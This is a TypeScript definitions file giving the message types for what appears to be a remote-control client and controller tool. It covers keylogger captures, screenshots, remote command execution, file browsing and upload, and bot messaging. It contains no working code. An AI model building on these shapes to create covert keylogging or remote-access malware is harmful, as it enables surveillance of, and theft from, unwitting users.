import { DirEntry, FileRequest, Process } from "./tasks.type";

export type RunCmdCommandEvent = {
  command: string;
};

export interface GetExplorerFromClientEvent {
  files: DirEntry[];
  folder: string;
  relativepath: string;
}

export interface GetKeyloggerFromClientEvent {
  keys: string[];
}

export interface MessageToBotEvent {
  message: string;
  editReply: boolean;
}

export interface TasksEvent {
  tasks: Process[];
}

export interface GetScreensFromClientEvent {
  identifier: string;
  screens: {
    id: number;
    resolution: [number, number];
    frequency: number;
    isprimary: boolean;
  }[];
}

export interface GetScreenshotFromClientEvent {
  buffer: ArrayBuffer;
}

export interface RunCmdCommand {
  stdout: string;
  pwd: string;
}

export interface ClientUploadFile {
  fileroute: string;
  clientid: string;
}

export interface ClientGetFile {
  fileroute: string;
  clientid: string;
}

export interface AddFileClient {
  clientid: string;
  file: FileRequest;
}

export interface AddFriend {
  controllerid: string;
}
